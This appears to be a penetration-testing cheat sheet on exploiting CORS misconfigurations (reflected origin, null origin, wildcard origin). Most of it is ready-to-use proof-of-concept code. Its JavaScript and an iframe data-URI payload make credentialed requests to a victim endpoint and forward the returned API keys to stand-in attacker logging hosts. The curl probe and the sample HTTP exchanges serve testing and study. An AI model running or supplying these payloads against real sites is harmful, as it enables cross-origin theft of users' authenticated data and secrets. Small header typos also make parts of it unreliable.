### Add header Origin

```
Origin: http://bing.com/
Origin: http://bing.com
Origin: bing.com/
Origin: bing.com
Origin: null
```

If you find the reponse contains the result, it maybe vulnerable:

```
Access-Control-Allow-Credential: true
Access-control-allow-origin: bing.com | * | null
```

Test using CURL: 

```
curl <domain> -H "Origin: <https://bing.com>" -I
```

### Origin Reflection

```
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### Exploit

This PoC requires that the respective JS script is hosted at evil.com

```javascript
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```

or 

```html
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://victim.example.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```

### Null Origin

It's possible that the server does not reflect the complete Origin header but that the null origin is allowed. This would look like this in the server's response:

```
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: null
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### Exploit

This can be exploited by putting the attack code into an iframe using the data URI scheme. If the data URI scheme is used, the browser will use the null origin in the request:

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```

## Wildcard Origin

If the server responds with a wildcard on Origin *, the browser never sends the cookies.

However, if the server does not require authentication, it is still possible to access the data on the server. This can happen on internal servers that are not accessible from the Internet. The attacker's website can then pass to the internal network and access the data on the server without authentication.

```
GET /endpoint HTTP/1.1
Host: api.internal.example.com
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"[private API key]"}
```

#### Exploit

```
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.internal.example.com/endpoint',true); 
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```